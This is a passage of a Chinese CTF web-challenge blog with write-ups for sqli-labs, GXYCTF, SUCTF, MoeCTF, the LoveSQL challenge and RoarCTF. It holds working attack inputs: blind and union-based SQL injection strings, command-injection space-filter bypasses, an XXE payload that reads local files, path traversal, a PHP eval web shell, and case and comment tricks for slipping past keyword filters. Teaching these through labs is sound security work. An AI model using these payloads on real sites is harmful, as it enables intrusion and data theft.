title="二、时间盲注"></a>二、时间盲注</h4><p>时间盲注是一种基于时间差的盲注方法。</p><p>在sqli-labs的第九关中，我们可以尝试使用时间盲注来获取管理员的密码。首先，我们需要找到注入点，然后构造一个类似于以下的查询语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND IF(SUBSTRING(password,1,1)=&#x27;a&#x27;, SLEEP(5), 0) --</span><br></pre></td></tr></table></figure><p>上述查询语句会判断密码的第一位是否为字母“a”，如果是，则执行一个延时5秒的函数（SLEEP）。通过观察返回结果集的时间差，如果延时超过5秒，说明密码的第一位可能是字母“a”。接着，我们可以尝试其他字符，并观察时间差的变化，最终可以获取到管理员的密码。</p><p>很多时候不推荐使用</p><p>方法二：sqlmap</p><p>方法三：抓包</p><p>数据库常用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and substr(database(),&#123;&#123;int(1-32)&#125;&#125;,1)=&#x27;&#123;&#123;list(a|b|c|0|1|_)&#125;&#125;&#x27; --+</span><br></pre></td></tr></table></figure><h2 id="GXYCTF2019-Ping-Ping-Ping-1-题解"><a href="#GXYCTF2019-Ping-Ping-Ping-1-题解" class="headerlink" title="[GXYCTF2019]Ping Ping Ping 1 题解"></a>[GXYCTF2019]Ping Ping Ping 1 题解</h2><p>&#x2F;?ip&#x3D;<br>提示我们输入关于ip的命令，明显就是ping喽<br>url后加127.0.0.1，ping通了</p><p>然后ls，会发现直接显示出了flag.php<br>尝试cat查看，发现显示<br>&#x2F;?ip&#x3D; fxck your space!<br>啥玩意，明显不让我们看，为什么呢？因为space空格，那我们替换空格。用可以填写能够代替空的某些专业术语就行</p><p>1、命令绕过空格方法有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;$9</span><br><span class="line">&#123;IFS&#125;</span><br><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //$1改成$加其他数字貌似都行</span><br><span class="line">IFS</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line">%20   (space)</span><br><span class="line">%09   (tab)</span><br><span class="line">X=$&#x27;cat\x09./flag.php&#x27;;$X       （\x09表示tab，也可以用\x20）</span><br></pre></td></tr></table></figure><p>2.有时会禁用cat:<br>解决方法是使用tac反向输出命令：</p><p>这个真的很有趣，比如内容是1，2，3<br>tac输出的是3，2，1<br>我觉得好可爱</p><p>切入正题：</p><p>输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=127.0.0.1;cat$IFS$1flag.php</span><br></pre></td></tr></table></figure><p>得到：<br>&#x2F;?ip&#x3D; fxck your flag!<br>诶哟，怎么flag也不行<br>那就制造一个不一样的flag<br>需要用到变量，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;a=g;fla$a</span><br></pre></td></tr></table></figure><p>试试看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure><p>得到flag</p><h2 id="攻防世界-robots-题解"><a href="#攻防世界-robots-题解" class="headerlink" title="攻防世界 robots 题解"></a>攻防世界 robots 题解</h2><p>抓包得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;&lt;/h1&gt;</span><br><span class="line">&lt;!--flag is not here--&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ol><li><p>url跟上&#x2F;robots.txt</p><p>返回：</p><p>User-agent: *<br>Disallow:<br>Disallow: f1ag_1s_h3re.php</p></li><li><p>url跟上&#x2F;f1ag_1s_h3re.php</p></li></ol><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><h3 id="1题解"><a href="#1题解" class="headerlink" title="1题解"></a>1题解</h3><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><h4 id="1-PIPES-AS-CONCAT：将-或运算符-转换为-连接字符，即将-前后拼接到一起。"><a href="#1-PIPES-AS-CONCAT：将-或运算符-转换为-连接字符，即将-前后拼接到一起。" class="headerlink" title="1.PIPES_AS_CONCAT：将 || 或运算符 转换为 连接字符，即将||前后拼接到一起。"></a>1.<strong>PIPES_AS_CONCAT：将 || 或运算符 转换为 连接字符，即将||前后拼接到一起。</strong></h4><p>把||变成字符串连接符，而不是或</p><p>涉及到mysql中sql_mode参数设置，设置 sql_mode&#x3D;pipes_as_concat字符就可以设置。</p><p>即set sql_mode&#x3D;ppipes_as_concat</p><h4 id="2-select语法"><a href="#2-select语法" class="headerlink" title="2. select语法"></a>2. select语法</h4><h5 id="2-1搜索用法（查数据库里的数据）——-不存在会报错"><a href="#2-1搜索用法（查数据库里的数据）——-不存在会报错" class="headerlink" title="2.1搜索用法（查数据库里的数据）—— 不存在会报错"></a>2.1搜索用法（查数据库里的数据）—— 不存在会报错</h5><p>如果 <code>select</code> 后面跟的是 <strong>数据库中的表、字段</strong>，那确实是 “搜索”，找不到就会报错：</p><h5 id="2-2-输出用法（打印常量-表达式）——-永远不报错，和数据库数据无关"><a href="#2-2-输出用法（打印常量-表达式）——-永远不报错，和数据库数据无关" class="headerlink" title="2.2 输出用法（打印常量 &#x2F; 表达式）—— 永远不报错，和数据库数据无关"></a>2.2 输出用法（打印常量 &#x2F; 表达式）—— 永远不报错，和数据库数据无关</h5><p>如果 <code>select</code> 后面跟的是 <strong>常量（1、’abc’）、数学表达式（1+2）</strong>，那它就像 “echo”，直接输出结果，根本不依赖数据库里的任何数据：</p><ul><li><p>例子 1：<code>select 1;</code> → 输出 1（和数据库里有没有表、有没有数据无关）；</p></li><li><p>例子 2：<code>select 1+2*3;</code> → 输出 7（SQL 直接计算表达式，不用查数据库）；</p></li><li><h6 id="例子-3：select-hello-→-输出-hello（字符串常量，天生存在）。"><a href="#例子-3：select-hello-→-输出-hello（字符串常量，天生存在）。" class="headerlink" title="例子 3：select &#39;hello&#39;; → 输出 hello（字符串常量，天生存在）。"></a>例子 3：<code>select &#39;hello&#39;;</code> → 输出 hello（字符串常量，天生存在）。</h6></li></ul><p>进入后显示：<br>Give me your flag, I will tell you if the flag is right.</p><p>1.输入以下语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1;desc `FLAG_TABLE`</span><br><span class="line">得：Nonono.</span><br><span class="line"></span><br><span class="line">1;show column from `FLAG_TABLE`</span><br><span class="line">得：Nonono.</span><br><span class="line"></span><br><span class="line">1; show databases;</span><br><span class="line">得：Nonono.</span><br></pre></td></tr></table></figure><p>观察一下这些语句：</p><p>1;一堆语句               </p><p>疑问：为什么要加1</p><p>因为我们猜测后端语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> $_POST[<span class="string">&#x27;query&#x27;</span>] <span class="operator">||</span> flag <span class="keyword">from</span> Flag;</span><br></pre></td></tr></table></figure><p>后端：</p><p>select $_POST[‘query’] || flag from Flag;</p><p>如果直接输入：show databases;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select show databases|| flag from Flag;</span><br></pre></td></tr></table></figure><p>不符合语法，你都没有用到select语句，就直接跟show了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>; <span class="keyword">show</span> databases<span class="operator">||</span> flag <span class="keyword">from</span> Flag;</span><br></pre></td></tr></table></figure><p>这样输入之后语法正确</p><p>2.1继续输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;show columns from Flag;#</span><br></pre></td></tr></table></figure><p>Nonono.</p><h4 id="思路一：输入payload（精心设计的恶意语句），然后把-看成拼接"><a href="#思路一：输入payload（精心设计的恶意语句），然后把-看成拼接" class="headerlink" title="思路一：输入payload（精心设计的恶意语句），然后把||看成拼接"></a>思路一：输入payload（精心设计的恶意语句），然后把||看成拼接</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 || flag from Flag</span><br></pre></td></tr></table></figure><p>这句话是：先搜索1，然后再搜索flag，再把俩值拼接起来</p><p>输入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>; sql_mode<span class="operator">=</span>PIPES_AS_CONCAT; <span class="operator">||</span> flag <span class="keyword">from</span> Flag;</span><br></pre></td></tr></table></figure><p><code>||</code> 前面没有任何操作，会导致语法错误！</p><p>所以末尾再加上select 1;</p><p>而且别忘记加上后末尾不要跟；  否则也会导致||前面没有任何操作</p><p>变成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;sql_mode=PIPES_AS_CONCAT;select 1  //不行，改变参数要用set</span><br><span class="line">1;set sql_mode=PIPES_AS_CONCAT;select 1  //成功</span><br></pre></td></tr></table></figure><h2 id="moectf-2025-05-第五章-打上门来！"><a href="#moectf-2025-05-第五章-打上门来！" class="headerlink" title="moectf 2025 05 第五章 打上门来！"></a>moectf 2025 05 第五章 打上门来！</h2><p>题目关键词：穿梭在文件目录</p><p>即 在文件目录中寻找flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./ 当前目录</span><br><span class="line">../上一级目录</span><br></pre></td></tr></table></figure><p>在当前目录发现给我们的所有内容中并没有flag，说明：在这些文件目录的下一级</p><p>于是我们输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../flag</span><br></pre></td></tr></table></figure><p>错了</p><p>寻找是否在 下一级目录的下一级中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../falg</span><br></pre></td></tr></table></figure><p>以此类推</p><p>直到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../../../../flag</span><br></pre></td></tr></table></figure><p>得到flag</p><p>典型的 XXE 注入漏洞 题目</p><p>知识点准备：</p><ol><li><p>XXE：XML 外部实体注入（当成sql注入看就行）</p></li><li><p>XML：&lt;标签&gt; 格式</p></li><li><p>file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;………….</p><p>linux结构</p></li></ol><p>通用格式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 任意名字 [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY 实体名 <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///文件绝对路径&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">网站接收的标签名</span>&gt;</span>&amp;实体名;<span class="tag">&lt;/<span class="name">网站接收的标签名</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第一步：</p><p>一进去发现有个大方框让你提交东西，随便写一个啥提交，得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;b&gt;Warning&lt;/b&gt;:  DOMDocument::loadXML(): Start tag expected, &#x27;&amp;lt;&#x27; not found in Entity, line: 1 in &lt;b&gt;/var/www/html/chapter10.php&lt;/b&gt; on line &lt;b&gt;17&lt;/b&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;阵枢&gt;引魂玉&lt;/阵枢&gt;</span><br><span class="line">&lt;解析&gt;未定义&lt;/解析&gt;</span><br><span class="line">&lt;输出&gt;未定义&lt;/输出&gt;</span><br></pre></td></tr></table></figure><p>分析：</p><p>1.<b>Warning</b>:  DOMDocument::loadXML(): Start tag expected, ‘&lt;’ not found in Entity</p><p>说明：第一，我们没有按照他所希望的格式注入：’&lt;’（也就是’&amp;lt’）</p><p>2.&lt;输出&gt;未定义&lt;&#x2F;输出&gt;</p><p>说明：第二，很明显了，格式是xml</p><p>第二，我们需要在这里获取flag内容</p><p>所以，这个会被后面用到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;网站要求的标签&gt;&amp;x;&lt;/网站要求的标签&gt;</span><br></pre></td></tr></table></figure><p>3.&#x2F;var&#x2F;www&#x2F;html&#x2F;chapter10.php</p><p>很明显，linux文件夹结构，也许flag就在这里面</p><p>可以改成：&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.txt</p><p>第二步：</p><p>输入对应格式的注入，拿到flag</p><p>固定格式：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 任意名字 [<span class="meta">&lt;!ENTITY 实体名 <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///文件绝对路径&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">网站接收的标签名</span>&gt;</span>&amp;实体名;<span class="tag">&lt;/<span class="name">网站接收的标签名</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE A [</span><br><span class="line">&lt;!ENTITY x SYSTEM &quot;file:///要读的文件路径&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;网站要求的标签&gt;&amp;x;&lt;/网站要求的标签&gt;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span>  //可以不写</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE 输出 [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///var/www/html/doLogin.php&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">输出</span>&gt;</span><span class="symbol">&amp;flag;</span><span class="tag">&lt;/<span class="name">输出</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>用<code>&amp;实体名;</code>的格式引用刚才定义的<code>flag</code>实体；</p><!DOCTYPE 输出 [<!ENTITY flag SYSTEM "file:///var/www/html/flag.txt"><p>]&gt;<br>&lt;输出&gt;&flag;&lt;&#x2F;输出&gt;</p><h2 id="MoeCTF-2025-12-第十二章-玉魄玄关·破妄"><a href="#MoeCTF-2025-12-第十二章-玉魄玄关·破妄" class="headerlink" title="MoeCTF 2025 12 第十二章 玉魄玄关·破妄"></a>MoeCTF 2025 12 第十二章 玉魄玄关·破妄</h2><p>1.一进入，看到了一句话木马</p><p>然后题解写着：一句话木马和flag在环境变量中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">@eval($_POST[&#x27;cmd&#x27;]);</span><br></pre></td></tr></table></figure><p>2.直接蚁剑连接，连接虚拟终端</p><p>![](&#x2F;images&#x2F;屏幕截图 2025-11-17 223714.png)</p><p>发现啊linux系统，我们要在里面找flag</p><p>直接输入：env |grep -i flag</p><p>-i选项：不分大小写grep过滤</p><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><h3 id="1题解-1"><a href="#1题解-1" class="headerlink" title="1题解"></a>1题解</h3><p>1.进去使用万能密码，登陆成功，<strong>发现一段乱码提交发现错误，这并不是flag</strong></p><p>原url：&#x2F;check.php?username&#x3D;1’+or+1%3D1%23&amp;password&#x3D;55</p><p>2.输入1-4，4处报错，说明没有第四个字段</p><p>（在输入1-3时他说你密码错误不要慌，你只是在找字段，只要他能正常显示说明此字段存在）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=1&#x27; order by 4%23&amp;password=ads</span><br></pre></td></tr></table></figure><p>3.寻找注入点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; union select 1,2,3%23&amp;password=ads</span><br></pre></td></tr></table></figure><p>​ </p><p>返回2，3；</p><p>说明这两处为注入点</p><p>4.寻找数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; union select 1,database(),3%23&amp;password=ads</span><br></pre></td></tr></table></figure><p> 其中，3%23&amp;password&#x3D;ads</p><p>​3是占位用的，没啥意义</p><p>​%23是# ；</p><p> 其次,为什么#后面还要输出，不是都注释掉了吗？</p><p>​因为**<code>#</code> 是 SQL 里的注释符，但它管不到 URL 的参数格式 —— 网站要求必须传 <code>password</code> 参数，所以得用 <code>&amp;password=ads</code> 补全格式，否则网站可能直接拒绝请求**</p><p>​返回：Hello geek！</p><p>​得到数据库：geek</p><p>5.寻找表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=ads</span><br></pre></td></tr></table></figure><ul><li><p><strong><code>group_concat</code></strong>：“分组拼接”，MySQL 的聚合函数，把多行结果拼接成一个字符串（用逗号分隔）</p></li><li><p><code>group_concat(table_name)</code>：把所有表名拼接成一个字符串返回（方便查看）；</p></li><li><p>table_schema：表所属数据库名</p></li><li><p><code>table_schema=database()</code>：限定只查当前连接的数据库的表。</p></li></ul><p>​返回：Your password is ‘geekuser,l0ve1ysq1’</p><p>​说明表名：geekuser,l0ve1ysq1</p><ol start="6"><li>寻找l0ve1ysq1的字段名</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;l0ve1ysq1&#x27;%23&amp;password=ads</span><br></pre></td></tr></table></figure><p>​返回：Your password is ‘id,username,password’</p><p>​说明字段名：id,username,password</p><p>7.寻找l0ve1ysq1表的id,username,password三个字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27; union select 1,database(),group_concat(id,username,password) from l0ve1ysq1%23&amp;password=ads</span><br></pre></td></tr></table></figure><p>​得到：Your password is  ‘1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag{7a23d0ab-def9-4f32-bd55-8e4155655f17}’</p><p>​说明：flag{7a23d0ab-def9-4f32-bd55-8e4155655f17}</p><h2 id="RoarCTF-2019-Easy-Java1题解"><a href="#RoarCTF-2019-Easy-Java1题解" class="headerlink" title="[RoarCTF 2019]Easy Java1题解"></a><strong>[RoarCTF 2019]Easy Java1</strong>题解</h2><p>1.又是账号密码登陆，没有头绪，用sql失败，看到下面help</p><p>java.io.FileNotFoundException:{help.docx}；</p><p>说明是个可下载文件，但当前get不行，用post试试</p><p>2.下载文件，发现无可用信息</p><p>3.看到 filename&#x3D;参数 ，用之前说的穿越目录，发现不可以</p><p>4.看到页面有tomcat，说明服务器了</p><p>试试：filename&#x3D;WEB-INF&#x2F;web.xml</p><p>为什么？</p><p><code>WEB-INF/web.xml</code> </p><ol><li><p>科普：</p><p>WEB-INF&#x2F; </p><p>目录是每个 Web 应用中必须存在的目录，包含一些配置信息，不会被直接暴露给客户端访问。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> WEB-<span class="meta">INF</span>主要包含以下文件或目录：</span><br><span class="line"> </span><br><span class="line">/WEB-<span class="meta">INF</span>/web<span class="number">.</span>xml：</span><br><span class="line">是 Tomcat 网站的「核心说明书」，藏着找 Flag 的关键线索，CTF 里碰到 Tomcat 任意文件下载漏洞，必查它！</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/WEB-<span class="meta">INF</span>/classes/：</span><br><span class="line">含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line"></span><br><span class="line">/WEB-<span class="meta">INF</span>/lib/：</span><br><span class="line">用于存放 Web 应用所依赖的 JAR 包。</span><br><span class="line"></span><br><span class="line">/WEB-<span class="meta">INF</span>/src/：</span><br><span class="line">源码目录，按照包名结构放置各个java文件。</span><br><span class="line"></span><br><span class="line">/WEB-<span class="meta">INF</span>/database<span class="number">.</span>properties：</span><br><span class="line">数据库配置文件</span><br></pre></td></tr></table></figure></li></ol><p>得到：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>Index<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.IndexController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        。。。。。</span><br><span class="line"> <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Flag<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span>        </span><br></pre></td></tr></table></figure><p>推出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Flag`对应的路径为`/WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure><p>4.filename&#x3D;WEB-INF&#x2F;classes&#x2F;com&#x2F;wm&#x2F;ctf&#x2F;FlagController.class文件，发现flag，解码</p><p>（末尾 &#x3D; &#x3D; 知道是base64）</p><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><table><thead><tr><th>咒语（符号）</th><th>作用</th><th>举例</th></tr></thead><tbody><tr><td><code>.</code>（点）</td><td>匹配 “任意一个字符”（比如汉字、数字、字母，除了换行）</td><td>咒语 “a.c” 能找到 “abc”“a1c”“a 好 c”（中间随便啥都行）</td></tr><tr><td><code>^</code>（尖尖）</td><td>匹配 “字符串开头”</td><td>咒语 “^flag” 能找到 “flag123”“flag {abc}”（必须以 flag 开头），找不到 “123flag”</td></tr><tr><td><code>$</code>（美元符）</td><td>匹配 “字符串结尾”</td><td>咒语 “}”$ 能找到 “abc}”“flag {123}”（必须以} 结尾），找不到 “} 123”</td></tr><tr><td><code>*</code>（星号）</td><td>前面的字符 “可以有 0 个或多个”</td><td>咒语 “a*b” 能找到 “b”（a 有 0 个）、“ab”（a 有 1 个）、“aaab”（a 有 3 个）</td></tr><tr><td><code>+</code>（加号）</td><td>前面的字符 “必须有 1 个或多个”</td><td>咒语 “a+b” 能找到 “ab”“aaab”（a 至少 1 个），找不到 “b”（a 有 0 个）</td></tr><tr><td><code>[]</code>（方括号）</td><td>匹配 “方括号里的任意一个”</td><td>咒语 “[123]” 能找到 “1”“2”“3”；咒语 “[a-z]” 能找到所有小写字母（a 到 z）</td></tr><tr><td><code>[^]</code>（方括号 + 尖尖）</td><td>匹配 “不在方括号里的任意一个”</td><td>咒语 <code>“[^0-9]” </code>能找到所有不是数字的字符（比如字母、符号）</td></tr><tr><td><code>\d</code>（d 小写）</td><td>专门匹配 “数字”（0-9）</td><td>咒语 “\d\d” 能找到 “12”“34”（两个数字），相当于 “[0-9][0-9]”</td></tr><tr><td><code>\w</code>（w 小写）</td><td>专门匹配 “字母、数字、下划线”</td><td>咒语 “\w” 能找到 “a”“5”“_”，找不到 “！”“@”</td></tr></tbody></table><h4 id="1-找-flag（最常用！）"><a href="#1-找-flag（最常用！）" class="headerlink" title="1. 找 flag（最常用！）"></a>1. 找 flag（最常用！）</h4><ul><li><p>正则咒语：<code>flag\{.*?\}</code>（念法：flag 左大括号，任意字符少少的，右大括号）；</p></li><li><p>原理：</p><ul><li><p><code>flag\{</code>：先找到 “flag {”（大括号要加 \，因为大括号是特殊咒语，得 “转义” 一下，告诉正则 “我就是要找大括号”）；</p></li><li><p><code>.*?</code>：<code>.*</code> 会尽可能多地吃字符,？）；</p><p>​      <code>？</code>意味吃到第一个就停</p></li><li><p><code>\}</code>：最后找到 “}”；</p></li></ul></li></ul><h4 id="2-绕限制（Web-题常用）"><a href="#2-绕限制（Web-题常用）" class="headerlink" title="2. 绕限制（Web 题常用）"></a>2. 绕限制（Web 题常用）</h4><ul><li><p>场景：网站不让输入 “union select”（比如 SQL 注入时），输入就被拦截（网站用正则检测这个关键词）；</p></li><li><p>正则咒语（网站的拦截规则）：<code>^.*union.*select.*$</code>（意思：只要包含 “union” 和 “select” 就拦截）；</p><p>​               <code>^  .*  union  .*  select  .*  $</code></p></li><li><p>绕过方法（改你的输入，让网站的正则认不出来）：</p><ul><li><p>大小写混淆：输入 “Union Select”（网站的正则只认小写，这样就绕过去了）；</p></li><li><p>插无关字符：输入 “uni&#x2F;<strong>&#x2F;on sel&#x2F;</strong>&#x2F;ect”</p><p>​        &#x2F;**&#x2F;：注释</p></li></ul></li><li><p>效果：成功输入你要的内容，实现 SQL 注入，拿到 flag！</p></li></ul><h4 id="3-筛密码（密码破解题）"><a href="#3-筛密码（密码破解题）" class="headerlink" title="3. 筛密码（密码破解题）"></a>3. 筛密码（密码破解题）</h4><ul><li>场景：题目说 “密码是 8 